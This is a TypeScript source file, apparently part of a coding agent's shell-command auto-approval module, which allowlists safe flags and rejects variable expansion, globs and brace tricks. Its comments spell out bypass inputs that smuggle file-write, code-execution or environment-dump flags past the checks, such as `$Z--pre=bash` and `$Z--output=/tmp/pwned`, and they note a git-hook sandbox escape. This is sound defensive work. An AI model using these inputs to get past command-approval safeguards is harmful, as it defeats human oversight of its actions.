			// `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
			// subdir at depth 2. FILE WRITE, zero permissions.
			"-P": "string", // Include pattern
			"-I": "string", // Exclude pattern
			"--gitignore": "none",
			"--gitfile": "string",
			"--ignore-case": "none",
			"--matchdirs": "none",
			"--metafirst": "none",
			"--prune": "none",
			"--info": "none",
			"--infofile": "string",
			"--noreport": "none",
			"--charset": "string",
			"--filelimit": "number",
			// File display options
			"-q": "none", // Non-printable as ?
			"-N": "none", // Non-printable as-is
			"-Q": "none", // Quote filenames
			"-p": "none", // Protections
			"-u": "none", // Owner
			"-g": "none", // Group
			"-s": "none", // Size bytes
			"-h": "none", // Human-readable sizes
			"--si": "none",
			"--du": "none",
			"-D": "none", // Last modification time
			"--timefmt": "string",
			"-F": "none", // Append indicator
			"--inodes": "none",
			"--device": "none",
			// Sorting options
			"-v": "none", // Version sort
			"-t": "none", // Sort by mtime
			"-c": "none", // Sort by ctime
			"-U": "none", // Unsorted
			"-r": "none", // Reverse sort
			"--dirsfirst": "none",
			"--filesfirst": "none",
			"--sort": "string",
			// Graphics/output options
			"-i": "none", // No indentation lines
			"-A": "none", // ANSI line graphics
			"-S": "none", // CP437 line graphics
			"-n": "none", // No color
			"-C": "none", // Color
			"-X": "none", // XML output
			"-J": "none", // JSON output
			"-H": "string", // HTML output with base HREF
			"--nolinks": "none",
			"--hintro": "string",
			"--houtro": "string",
			"-T": "string", // HTML title
			"--hyperlink": "none",
			"--scheme": "string",
			"--authority": "string",
			// Input options (read from file, not write)
			"--fromfile": "none",
			"--fromtabfile": "none",
			"--fflinks": "none",
			// Help and version
			"--help": "none",
			"--version": "none",
		},
	},
	// date command - moved from READONLY_COMMANDS because -s/--set can set system time
	// Also -f/--file can be used to read dates from file and set time
	// We only allow safe display options
	date: {
		safeFlags: {
			// Display options (safe - don't modify system time)
			"-d": "string", // --date=STRING - display time described by STRING
			"--date": "string",
			"-r": "string", // --reference=FILE - display file's modification time
			"--reference": "string",
			"-u": "none", // --utc - use UTC
			"--utc": "none",
			"--universal": "none",
			// Output format options
			"-I": "none", // --iso-8601 (can have optional argument, but none type handles bare flag)
			"--iso-8601": "string",
			"-R": "none", // --rfc-email
			"--rfc-email": "none",
			"--rfc-3339": "string",
			// Debug/help
			"--debug": "none",
			"--help": "none",
			"--version": "none",
		},
		// Dangerous flags NOT included (blocked by omission):
		// -s / --set - sets system time
		// -f / --file - reads dates from file (can be used to set time in batch)
		// CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
		// Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// args are already parsed tokens after "date"
			// Flags that require an argument
			const flagsWithArgs = new Set(["-d", "--date", "-r", "--reference", "--iso-8601", "--rfc-3339"])
			let i = 0
			while (i < args.length) {
				const token = args[i]!
				// Skip flags and their arguments
				if (token.startsWith("--") && token.includes("=")) {
					// Long flag with =value, already consumed
					i++
				} else if (token.startsWith("-")) {
					// Flag - check if it takes an argument
					if (flagsWithArgs.has(token)) {
						i += 2 // Skip flag and its argument
					} else {
						i++ // Just skip the flag
					}
				} else {
					// Positional argument - must start with + for format strings
					// Anything else (like MMDDhhmm) could set system time
					if (!token.startsWith("+")) {
						return true // Dangerous
					}
					i++
				}
			}
			return false // Safe
		},
	},
	// hostname command - moved from READONLY_COMMANDS because positional args set hostname
	// Also -F/--file sets hostname from file, -b/--boot sets default hostname
	// We only allow safe display options and BLOCK any positional arguments
	hostname: {
		safeFlags: {
			// Display options only (safe)
			"-f": "none", // --fqdn - display FQDN
			"--fqdn": "none",
			"--long": "none",
			"-s": "none", // --short - display short name
			"--short": "none",
			"-i": "none", // --ip-address
			"--ip-address": "none",
			"-I": "none", // --all-ip-addresses
			"--all-ip-addresses": "none",
			"-a": "none", // --alias
			"--alias": "none",
			"-d": "none", // --domain
			"--domain": "none",
			"-A": "none", // --all-fqdns
			"--all-fqdns": "none",
			"-v": "none", // --verbose
			"--verbose": "none",
			"-h": "none", // --help
			"--help": "none",
			"-V": "none", // --version
			"--version": "none",
		},
		// CRITICAL: Block any positional arguments - they set the hostname
		// Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safeFlags = blocked)
		// Use regex to ensure no positional args after flags
		regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
	},
	// info command - moved from READONLY_COMMANDS because -o/--output writes to files
	// Also --dribble writes keystrokes to file, --init-file loads custom config
	// We only allow safe display/navigation options
	info: {
		safeFlags: {
			// Navigation/display options (safe)
			"-f": "string", // --file - specify manual file to read
			"--file": "string",
			"-d": "string", // --directory - search path
			"--directory": "string",
			"-n": "string", // --node - specify node
			"--node": "string",
			"-a": "none", // --all
			"--all": "none",
			"-k": "string", // --apropos - search
			"--apropos": "string",
			"-w": "none", // --where - show location
			"--where": "none",
			"--location": "none",
			"--show-options": "none",
			"--vi-keys": "none",
			"--subnodes": "none",
			"-h": "none",
			"--help": "none",
			"--usage": "none",
			"--version": "none",
		},
		// Dangerous flags NOT included (blocked by omission):
		// -o / --output - writes output to file
		// --dribble - records keystrokes to file
		// --init-file - loads custom config (potential code execution)
		// --restore - replays keystrokes from file
	},

	lsof: {
		safeFlags: {
			"-?": "none",
			"-h": "none",
			"-v": "none",
			"-a": "none",
			"-b": "none",
			"-C": "none",
			"-l": "none",
			"-n": "none",
			"-N": "none",
			"-O": "none",
			"-P": "none",
			"-Q": "none",
			"-R": "none",
			"-t": "none",
			"-U": "none",
			"-V": "none",
			"-X": "none",
			"-H": "none",
			"-E": "none",
			"-F": "none",
			"-g": "none",
			"-i": "none",
			"-K": "none",
			"-L": "none",
			"-o": "none",
			"-r": "none",
			"-s": "none",
			"-S": "none",
			"-T": "none",
			"-x": "none",
			"-A": "string",
			"-c": "string",
			"-d": "string",
			"-e": "string",
			"-k": "string",
			"-p": "string",
			"-u": "string",
			// OMITTED (writes to disk): -D (device cache file build/update)
		},
		// Block +m (create mount supplement file) — writes to disk.
		// +prefix flags are treated as positional args by validateFlags,
		// so we must catch them here. lsof accepts +m<path> (attached path, no space)
		// with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
		additionalCommandIsDangerousCallback: (_rawCommand, args) =>
			args.some(a => a === "+m" || a.startsWith("+m")),
	},

	pgrep: {
		safeFlags: {
			"-d": "string",
			"--delimiter": "string",
			"-l": "none",
			"--list-name": "none",
			"-a": "none",
			"--list-full": "none",
			"-v": "none",
			"--inverse": "none",
			"-w": "none",
			"--lightweight": "none",
			"-c": "none",
			"--count": "none",
			"-f": "none",
			"--full": "none",
			"-g": "string",
			"--pgroup": "string",
			"-G": "string",
			"--group": "string",
			"-i": "none",
			"--ignore-case": "none",
			"-n": "none",
			"--newest": "none",
			"-o": "none",
			"--oldest": "none",
			"-O": "string",
			"--older": "string",
			"-P": "string",
			"--parent": "string",
			"-s": "string",
			"--session": "string",
			"-t": "string",
			"--terminal": "string",
			"-u": "string",
			"--euid": "string",
			"-U": "string",
			"--uid": "string",
			"-x": "none",
			"--exact": "none",
			"-F": "string",
			"--pidfile": "string",
			"-L": "none",
			"--logpidfile": "none",
			"-r": "string",
			"--runstates": "string",
			"--ns": "string",
			"--nslist": "string",
			"--help": "none",
			"-V": "none",
			"--version": "none",
		},
	},

	tput: {
		safeFlags: {
			"-T": "string",
			"-V": "none",
			"-x": "none",
			// SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
			// It must NOT be in safeFlags because validateFlags unbundles combined
			// short flags (e.g., -xS → -x + -S), but the callback receives the raw
			// token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
			// from safeFlags ensures validateFlags rejects it (bundled or not) before
			// the callback runs. The callback's -S check is defense-in-depth.
		},
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Capabilities that modify terminal state or could be harmful.
			// init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
			// rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
			// init/reset invoke internally — rs1 sends ESC c (full terminal reset).
			// clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
			// (redirect output to printer device). smcup/rmcup manipulate screen buffer.
			// pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
			// rf is reset file (analogous to if/init_file).
			const DANGEROUS_CAPABILITIES = new Set([
				"init",
				"reset",
				"rs1",
				"rs2",
				"rs3",
				"is1",
				"is2",
				"is3",
				"iprog",
				"if",
				"rf",
				"clear",
				"flash",
				"mc0",
				"mc4",
				"mc5",
				"mc5i",
				"mc5p",
				"pfkey",
				"pfloc",
				"pfx",
				"pfxl",
				"smcup",
				"rmcup",
			])
			const flagsWithArgs = new Set(["-T"])
			let i = 0
			let afterDoubleDash = false
			while (i < args.length) {
				const token = args[i]!
				if (token === "--") {
					afterDoubleDash = true
					i++
				} else if (!afterDoubleDash && token.startsWith("-")) {
					// Defense-in-depth: block -S even if it somehow passes validateFlags
					if (token === "-S") return true
					// Also check for -S bundled with other flags (e.g., -xS)
					if (!token.startsWith("--") && token.length > 2 && token.includes("S")) return true
					if (flagsWithArgs.has(token)) {
						i += 2
					} else {
						i++
					}
				} else {
					if (DANGEROUS_CAPABILITIES.has(token)) return true
					i++
				}
			}
			return false
		},
	},

	// ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
	// SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
	// are deliberately excluded. -F/--filter (read filter from file) also excluded.
	ss: {
		safeFlags: {
			"-h": "none",
			"--help": "none",
			"-V": "none",
			"--version": "none",
			"-n": "none",
			"--numeric": "none",
			"-r": "none",
			"--resolve": "none",
			"-a": "none",
			"--all": "none",
			"-l": "none",
			"--listening": "none",
			"-o": "none",
			"--options": "none",
			"-e": "none",
			"--extended": "none",
			"-m": "none",
			"--memory": "none",
			"-p": "none",
			"--processes": "none",
			"-i": "none",
			"--info": "none",
			"-s": "none",
			"--summary": "none",
			"-4": "none",
			"--ipv4": "none",
			"-6": "none",
			"--ipv6": "none",
			"-0": "none",
			"--packet": "none",
			"-t": "none",
			"--tcp": "none",
			"-M": "none",
			"--mptcp": "none",
			"-S": "none",
			"--sctp": "none",
			"-u": "none",
			"--udp": "none",
			"-d": "none",
			"--dccp": "none",
			"-w": "none",
			"--raw": "none",
			"-x": "none",
			"--unix": "none",
			"--tipc": "none",
			"--vsock": "none",
			"-f": "string",
			"--family": "string",
			"-A": "string",
			"--query": "string",
			"--socket": "string",
			"-Z": "none",
			"--context": "none",
			"-z": "none",
			"--contexts": "none",
			// SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
			// to switch network namespace. While isolated to forked process, too invasive.
			"-b": "none",
			"--bpf": "none",
			"-E": "none",
			"--events": "none",
			"-H": "none",
			"--no-header": "none",
			"-O": "none",
			"--oneline": "none",
			"--tipcinfo": "none",
			"--tos": "none",
			"--cgroup": "none",
			"--inet-sockopt": "none",
			// SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
			// SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
			// SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
		},
	},

	// fd/fdfind — fast file finder (fd-find). Read-only search tool.
	// SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
	// (execute command with all results) are deliberately excluded.
	fd: { safeFlags: { ...FD_SAFE_FLAGS } },
	// fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
	fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

	...PYRIGHT_READ_ONLY_COMMANDS,
	...DOCKER_READ_ONLY_COMMANDS,
}

/**
 * Commands that are safe to use as xargs targets for auto-approval.
 *
 * SECURITY: Only add a command to this list if it has NO flags that can:
 * 1. Write to files (e.g., find's -fprint, sed's -i)
 * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
 * 3. Make network requests
 *
 * These commands must be purely read-only utilities. When xargs uses one of
 * these as a target, we stop validating flags after the target command
 * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
 * must not have ANY dangerous flags, not just a safe subset.
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
	"echo", // Output only, no dangerous flags
	"printf", // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
	"wc", // Read-only counting, no dangerous flags
	"grep", // Read-only search, no dangerous flags
	"head", // Read-only, no dangerous flags
	"tail", // Read-only (including -f follow), no dangerous flags
]

/**
 * Unified command validation function that replaces individual validator functions.
 * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
 * Handles combined flags, argument validation, and shell quoting bypass detection.
 *
 * (PORT NOTE: the source's getCommandAllowlist() platform/ant variants are dropped —
 * the ported allowlist is the bash, non-ant COMMAND_ALLOWLIST as-is.)
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
	// Parse the command to get individual tokens using the shell tokenizer.
	// Handle glob operators by keeping them as literal text, they don't matter from
	// the perspective of this function.
	const parseResult = tokenizeShellCommand(command)
	if (!parseResult.ok) return false

	// If there are operators (pipes, redirects, comments, etc.), it's not a simple
	// command. Breaking commands down into their constituent parts is handled
	// upstream of this function, so we reject anything with operators here.
	const hasOperators = parseResult.tokens.some(token => token.kind !== "str")
	if (hasOperators) {
		return false
	}

	const tokens = parseResult.tokens.map(token => token.value)

	if (tokens.length === 0) {
		return false
	}

	// Find matching command configuration
	let commandConfig: CommandConfig | undefined
	let commandTokens = 0

	// Check for multi-word commands first (e.g., "git diff", "git stash list")
	const allowlist = COMMAND_ALLOWLIST
	for (const [cmdPattern] of Object.entries(allowlist)) {
		const cmdTokens = cmdPattern.split(" ")
		if (tokens.length >= cmdTokens.length) {
			let matches = true
			for (let i = 0; i < cmdTokens.length; i++) {
				if (tokens[i] !== cmdTokens[i]) {
					matches = false
					break
				}
			}
			if (matches) {
				commandConfig = allowlist[cmdPattern]
				commandTokens = cmdTokens.length
				break
			}
		}
	}

	if (!commandConfig) {
		return false // Command not in allowlist
	}

	// Special handling for git ls-remote to reject URLs that could lead to data exfiltration
	if (tokens[0] === "git" && tokens[1] === "ls-remote") {
		// Check if any argument looks like a URL or remote specification
		for (let i = 2; i < tokens.length; i++) {
			const token = tokens[i]
			if (token && !token.startsWith("-")) {
				// Reject HTTP/HTTPS URLs
				if (token.includes("://")) {
					return false
				}
				// Reject SSH URLs like git@github.com:user/repo.git
				if (token.includes("@") || token.includes(":")) {
					return false
				}
				// Reject variable references
				if (token.includes("$")) {
					return false
				}
			}
		}
	}

	// SECURITY: Reject ANY token containing `$` (variable expansion). The tokenizer
	// preserves `$VAR` as LITERAL TEXT in tokens, but bash expands it at runtime
	// (unset vars → empty string). This parser differential defeats BOTH
	// validateFlags and callbacks:
	//
	//   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
	//       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
	//       (starts with `$`) falls through as positional. Bash runs
	//       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
	//
	//   (2) `$VAR`-prefix → RCE via `rg --pre`:
	//       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
	//       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
	//
	//   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
	//       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
	//       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
	//       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
	//       tokens would NOT close this.
	//
	// We check ALL tokens after the command prefix. Any `$` means we cannot
	// determine the runtime token value, so we cannot verify read-only safety.
	// This check must run BEFORE validateFlags and BEFORE callbacks.
	for (let i = commandTokens; i < tokens.length; i++) {
		const token = tokens[i]
		if (!token) continue
		// Reject any token containing $ (variable expansion)
		if (token.includes("$")) {
			return false
		}
		// Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
		// `git diff {@'{'0},--output=/tmp/pwned}` → quotes stripped
		// → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
		// This is defense-in-depth with validateBraceExpansion in bashSecurity.
		// We require BOTH `{` and `,` to avoid false positives on legitimate
		// patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
		// template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
		// `{1..5}` also needs checking (has `{` + `..`).
		if (token.includes("{") && (token.includes(",") || token.includes(".."))) {
			return false
		}
	}

	// Validate flags starting after the command tokens
	if (
		!validateFlags(tokens, commandTokens, commandConfig, {
			commandName: tokens[0],
			rawCommand: command,
			xargsTargetCommands: tokens[0] === "xargs" ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
		})
	) {
		return false
	}

	if (commandConfig.regex && !commandConfig.regex.test(command)) {
		return false
	}
	if (!commandConfig.regex && /`/.test(command)) {
		return false
	}
	// Block newlines and carriage returns in grep/rg patterns as they can be used for injection
	if (
		!commandConfig.regex &&
		(tokens[0] === "rg" || tokens[0] === "grep") &&
		/[\n\r]/.test(command)
	) {
		return false
	}
	if (
		commandConfig.additionalCommandIsDangerousCallback &&
		commandConfig.additionalCommandIsDangerousCallback(command, tokens.slice(commandTokens))
	) {
		return false
	}

	return true
}

/**
 * Creates a regex pattern that matches safe invocations of a command.
 *
 * The regex ensures commands are invoked safely by blocking:
 * - Shell metacharacters that could lead to command injection or redirection
 * - Command substitution via backticks or $()
 * - Variable expansion that could contain malicious payloads
 * - Environment variable assignment bypasses (command=value)
 */
function makeRegexForSafeCommand(command: string): RegExp {
	// Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
	return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
// WARNING: If you are adding new commands here, be very careful to ensure
// they are truly safe. This includes ensuring:
// 1. That they don't have any flags that allow file writing or command execution
// 2. Use makeRegexForSafeCommand() to ensure proper regex pattern creation
const READONLY_COMMANDS = [
	// Cross-platform commands from shared validation
	...EXTERNAL_READONLY_COMMANDS,

	// Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)

	// Time and date
	"cal",
	"uptime",

	// File content viewing (relative paths handled separately)
	"cat",
	"head",
	"tail",
	"wc",
	"stat",
	"strings",
	"hexdump",
	"od",
	"nl",

	// System info
	"id",
	"uname",
	"free",
	"df",
	"du",
	"locale",
	"groups",
	"nproc",

	// Path information
	"basename",
	"dirname",
	"realpath",

	// Text processing
	"cut",
	"paste",
	"tr",
	"column",
	"tac", // Reverse cat — displays file contents in reverse line order
	"rev", // Reverse characters in each line
	"fold", // Wrap lines to specified width
	"expand", // Convert tabs to spaces
	"unexpand", // Convert spaces to tabs
	"fmt", // Simple text formatter — output to stdout only
	"comm", // Compare sorted files line by line
	"cmp", // Byte-by-byte file comparison
	"numfmt", // Number format conversion

	// Path information (additional)
	"readlink", // Resolve symlinks — displays target of symbolic link

	// File comparison
	"diff",

	// true and false, used to silence or create errors
	"true",
	"false",

	// Misc. safe commands
	"sleep",
	"which",
	"type",
	"expr", // Evaluate expressions (arithmetic, string matching)
	"test", // Conditional evaluation (file checks, comparisons)
	"getconf", // Get system configuration values
	"seq", // Generate number sequences
	"tsort", // Topological sort
	"pr", // Paginate files for printing
]

// Complex commands that require custom regex patterns
// Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
// instead. This allowlist-based approach to CLI flags is more secure and avoids
// vulns coming from gnu getopt_long.
const READONLY_COMMAND_REGEXES = new Set([
	// Convert simple commands to regex patterns using makeRegexForSafeCommand
	...READONLY_COMMANDS.map(makeRegexForSafeCommand),

	// Echo that doesn't execute commands or use variables
	// Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
	// Also allow optional 2>&1 stderr redirection at the end
	// (PORT NOTE: the two Claude-CLI-specific regexes `/^claude -h$/` and
	// `/^claude --help$/` from the source are intentionally dropped.)
	/^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

	// Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
	// (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)

	/^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files

	// System info
	/^pwd$/,
	/^whoami$/,
	// env and printenv removed - could expose sensitive environment variables

	// Development tools version checking - exact match only, no suffix allowed.
	// SECURITY: `node -v --run <task>` would execute package.json scripts because
	// Node processes --run before -v. Python/python3 --version are also anchored
	// for defense-in-depth. These were previously in EXTERNAL_READONLY_COMMANDS which
	// flows through makeRegexForSafeCommand and permits arbitrary suffixes.
	/^node -v$/,
	/^node --version$/,
	/^python --version$/,
	/^python3 --version$/,

	// Misc. safe commands
	// tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
	/^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
	/^alias$/,
	/^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments

	// Network commands - only allow exact commands with no arguments to prevent network manipulation
	/^ip addr$/, // Only allow "ip addr" with no additional arguments
	/^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)

	// JSON processing with jq - allow with inline filters and file arguments
	// Allow pipes and complex expressions within quotes but prevent dangerous flags
	// Block command substitution - backticks are dangerous even in single quotes for jq
	// Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
	// Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
	/^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

	// Path commands (path validation ensures they're allowed)
	// cd command - allows changing to directories
	/^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
	// ls command - allows listing directories
	/^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
	// find command - blocks dangerous flags
	// Allow escaped parentheses \( and \) for grouping, but block unescaped ones
	// NOTE: \\[()] must come BEFORE the character class to ensure \( is matched as an escaped paren,
	// not as backslash + paren (which would fail since paren is excluded from the character class)
	/^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
 * variables OUTSIDE the quote contexts where bash would treat them as literal.
 * These could expand to bypass our regex-based security checks.
 *
 * Glob examples:
 * - `python *` could expand to `python --help` if a file named `--help` exists
 * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
 * Globs are literal inside BOTH single and double quotes.
 *
 * Variable expansion examples:
 * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
 *   with IFS word splitting, this smuggles positional args past "flags-only"
 *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
 * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
 * Variables are literal ONLY inside single quotes; they expand inside double
 * quotes and unquoted.
 *
 * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
 * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
 * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
 * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
 * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
 * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.
 */
function containsUnquotedExpansion(command: string): boolean {
	// Track quote state to avoid false positives for patterns inside quoted strings
	let inSingleQuote = false
	let inDoubleQuote = false
	let escaped = false

	for (let i = 0; i < command.length; i++) {
		const currentChar = command[i]

		// Handle escape sequences
		if (escaped) {
			escaped = false
			continue
		}

		// SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
		// `\` inside `'...'` is LITERAL — it does not escape the next character.
		// Without this guard, `'\'` desyncs the quote tracker: the `\` sets
		// escaped=true, then the closing `'` is consumed by the escaped-skip
		// instead of toggling inSingleQuote. Parser stays in single-quote
		// mode for the rest of the command, missing ALL subsequent expansions.
		// Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
		// `*` is inside quotes → returns false (glob NOT detected).
		if (currentChar === "\\" && !inSingleQuote) {
			escaped = true
			continue
		}

		// Update quote state
		if (currentChar === "'" && !inDoubleQuote) {
			inSingleQuote = !inSingleQuote
			continue
		}

		if (currentChar === '"' && !inSingleQuote) {
			inDoubleQuote = !inDoubleQuote
			continue
		}

		// Inside single quotes: everything is literal. Skip.
		if (inSingleQuote) {
			continue
		}

		// Check `$` followed by variable-name or special-parameter character.
		// `$` expands inside double quotes AND unquoted (only SQ makes it literal).
		if (currentChar === "$") {
			const next = command[i + 1]
			if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
				return true
			}
		}

		// Globs are literal inside double quotes too. Only check unquoted.
		if (inDoubleQuote) {
			continue
		}

		// Check for glob characters outside all quotes.
		// These could expand to anything, including dangerous flags.
		if (currentChar && /[?*[\]]/.test(currentChar)) {
			return true
		}
	}

	return false
}

/**
 * Checks if a single command string is read-only based on
 * isCommandSafeViaFlagParsing and READONLY_COMMAND_REGEXES.
 */
function isCommandReadOnly(command: string): boolean {
	// Handle common stderr-to-stdout redirection pattern
	// This handles both "command 2>&1" at the end of a full command
	// and "command 2>&1" as part of a pipeline component
	let testCommand = command.trim()
	if (testCommand.endsWith(" 2>&1")) {
		// Remove the stderr redirection for pattern matching
		testCommand = testCommand.slice(0, -5).trim()
	}

	// Check for Windows UNC paths that could be vulnerable to WebDAV attacks
	// Do this early to prevent any command with UNC paths from being marked as read-only
	if (containsVulnerableUncPath(testCommand)) {
		return false
	}

	// Check for unquoted glob characters and expandable `$` variables that could
	// bypass our regex-based security checks. We can't know what these expand to
	// at runtime, so we can't verify the command is read-only.
	if (containsUnquotedExpansion(testCommand)) {
		return false
	}

	// Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
	// Regex filters can be bypassed, so we use strict allowlist validation instead.
	// This requires defining a set of known safe flags.
	if (isCommandSafeViaFlagParsing(testCommand)) {
		return true
	}

	for (const regex of READONLY_COMMAND_REGEXES) {
		if (regex.test(testCommand)) {
			// Prevent git commands with -c flag to avoid config options that can lead to code execution
			// The -c flag allows setting arbitrary git config values inline, including dangerous ones like
			// core.fsmonitor, diff.external, core.gitProxy, etc. that can execute arbitrary commands
			// Check for -c preceded by whitespace and followed by whitespace or equals
			// Using regex to catch spaces, tabs, and other whitespace (not part of other flags like --cached)
			if (testCommand.includes("git") && /\s-c[\s=]/.test(testCommand)) {
				return false
			}

			// Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
			// The --exec-path flag allows overriding the directory where git looks for executables
			if (testCommand.includes("git") && /\s--exec-path[\s=]/.test(testCommand)) {
				return false
			}

			// Prevent git commands with --config-env flag to avoid config injection via environment variables
			// The --config-env flag allows setting git config values from environment variables, which can be
			// just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
			if (testCommand.includes("git") && /\s--config-env[\s=]/.test(testCommand)) {
				return false
			}
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Git compound-command security gates
// ---------------------------------------------------------------------------

/**
 * Checks if a segment is a git command. Mirrors isNormalizedGitCommand:
 * matches a leading `git` token or `xargs git ...` (xargs runs git in the
 * current directory, so it must be treated as a git command for cd+git and
 * bare-repo security checks).
 *
 * PORT NOTE: the source additionally strips safe wrappers (env-var prefixes,
 * timeout/nice/...) before matching. That stripping is not ported; wrapper-
 * prefixed git commands fall through the gates here but still fail the
 * per-segment read-only check, keeping the overall decision "passthrough".
 */
function isGitCommandSegment(segment: string): boolean {
	// Fast path: catch the most common case before any parsing
	if (segment === "git" || segment.startsWith("git ")) {
		return true
	}
	const parsed = tokenizeShellCommand(segment)
	if (parsed.ok) {
		const strings = parsed.tokens.filter(t => t.kind === "str").map(t => t.value)
		if (strings.length > 0) {
			// Direct git command
			if (strings[0] === "git") {
				return true
			}
			// "xargs git ..." — xargs runs git in the current directory,
			// so it must be treated as a git command for cd+git security checks.
			if (strings[0] === "xargs" && strings.includes("git")) {
				return true
			}
			return false
		}
	}
	return /^git(?:\s|$)/.test(segment)
}

/**
 * Git-internal path patterns that can be exploited for sandbox escape.
 * If a command creates these files and then runs git, the git command
 * could execute malicious hooks from the created files.
 */
const GIT_INTERNAL_PATTERNS = [/^HEAD$/, /^objects(?:\/|$)/, /^refs(?:\/|$)/, /^hooks(?:\/|$)/]

/**
 * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
 */
function isGitInternalPath(path: string): boolean {
	// Normalize path by removing leading ./ or /
	const normalized = path.replace(/^\.?\//, "")
	return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

/**
 * Extracts positional (non-flag) arguments, correctly handling the POSIX `--`
 * end-of-options delimiter (ported from pathValidation.ts filterOutFlags).
 */
function filterOutFlags(args: string[]): string[] {
	const result: string[] = []
